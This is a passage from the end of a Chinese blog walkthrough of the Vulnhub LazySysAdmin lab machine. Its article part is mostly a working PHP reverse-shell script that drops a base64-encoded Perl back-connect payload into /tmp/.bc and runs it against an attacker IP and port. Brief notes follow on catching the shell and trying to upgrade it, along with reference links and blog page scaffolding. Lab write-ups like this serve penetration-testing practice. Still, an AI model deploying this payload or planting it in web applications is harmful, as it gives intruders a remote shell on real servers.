+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span><span class="params">($pr)</span> </span>&#123;</span><br><span class="line">$path = execute(<span class="string">"which $pr"</span>);</span><br><span class="line"><span class="keyword">return</span> ($path ? $path : $pr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cfe)</span> </span>&#123;</span><br><span class="line">$res = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($cfe) &#123;</span><br><span class="line"><span class="keyword">if</span>(function_exists(<span class="string">'exec'</span>)) &#123;</span><br><span class="line">@exec($cfe,$res);</span><br><span class="line">$res = join(<span class="string">"\n"</span>,$res);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'shell_exec'</span>)) &#123;</span><br><span class="line">$res = @shell_exec($cfe);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'system'</span>)) &#123;</span><br><span class="line">@ob_start();</span><br><span class="line">@system($cfe);</span><br><span class="line">$res = @ob_get_contents();</span><br><span class="line">@ob_end_clean();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'passthru'</span>)) &#123;</span><br><span class="line">@ob_start();</span><br><span class="line">@passthru($cfe);</span><br><span class="line">$res = @ob_get_contents();</span><br><span class="line">@ob_end_clean();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(@is_resource($f = @popen($cfe,<span class="string">"r"</span>))) &#123;</span><br><span class="line">$res = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">while</span>(!@feof($f)) &#123;</span><br><span class="line">$res .= @fread($f,<span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line">@pclose($f);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span><span class="params">($fname,$text)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>($fp=@fopen($fname,<span class="string">'w'</span>)) &#123;</span><br><span class="line">@fputs($fp,@base64_decode($text));</span><br><span class="line">@fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$yourip = <span class="string">"192.168.64.131"</span>; <span class="comment">//修改这里</span></span><br><span class="line">$yourport = <span class="string">"4444"</span>; <span class="comment">// 修改这里</span></span><br><span class="line">$usedb = <span class="keyword">array</span>(<span class="string">'perl'</span>=&gt;<span class="string">'perl'</span>,<span class="string">'c'</span>=&gt;<span class="string">'c'</span>);</span><br><span class="line">$back_connect=<span class="string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span>.</span><br><span class="line"><span class="string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span>.</span><br><span class="line"><span class="string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span>.</span><br><span class="line"><span class="string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span>.</span><br><span class="line"><span class="string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span>.</span><br><span class="line"><span class="string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span>.</span><br><span class="line"><span class="string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>;</span><br><span class="line">cf(<span class="string">'/tmp/.bc'</span>,$back_connect);</span><br><span class="line">$res = execute(which(<span class="string">'perl'</span>).<span class="string">" /tmp/.bc $yourip $yourport &amp;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问后接受到shell</p>
+<img src="//songxpu.github.io/2019/08/10/LazySysAdmin/kali.png" width="700" height>
+
+<p>但经过尝试，如</p>
+<p><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p><code>su togie</code></p>
+<p>提示must be run from a terminal，没办法走方法2，从而使用方法1直接登陆ssh切换到管理员账号</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ol>
+<li><a href="https://xz.aliyun.com/t/2789#toc-7" target="_blank" rel="noopener">Vulnhub-LazySysAdmin 通关指南</a></li>
+<li><a href="https://blog.csdn.net/qq_33438733/article/details/82874640" target="_blank" rel="noopener">带妹玩转Vulnhub【一】</a></li>
+<li><a href="http://192.168.8.134/wordpress/wp-content/themes/twentyfourteen/404.php" target="_blank" rel="noopener">Lazysysadmin渗透实战</a></li>
+</ol>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+          
+            <a href="/tags/提权/" rel="tag"># 提权</a>
+          
+            <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/10/Lampiao/" rel="next" title="Lampiao渗透实战">
+                <i class="fa fa-chevron-left"></i> Lampiao渗透实战
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Azeroth</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#渗透测试"><span class="nav-number">2.</span> <span class="nav-text">渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#主机发现"><span class="nav-number">2.1.</span> <span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#端口扫描"><span class="nav-number">2.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#enum4linux扫描"><span class="nav-number">2.3.</span> <span class="nav-text">enum4linux扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web目录扫描"><span class="nav-number">2.4.</span> <span class="nav-text">web目录扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WPScan扫描"><span class="nav-number">2.5.</span> <span class="nav-text">WPScan扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Web站点信息"><span class="nav-number">2.6.</span> <span class="nav-text">Web站点信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Samba协议登录"><span class="nav-number">2.7.</span> <span class="nav-text">Samba协议登录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSH登录-方法1"><span class="nav-number">2.8.</span> <span class="nav-text">SSH登录(方法1)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web渗透-方法2"><span class="nav-number">2.9.</span> <span class="nav-text">web渗透(方法2)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文章"><span class="nav-number">3.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Azeroth</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">19k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">17 分钟</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>
+
+
+
+<span id="busuanzi_container_site_uv">
+  本站访问次数：<span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+</span>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.2"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.2"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
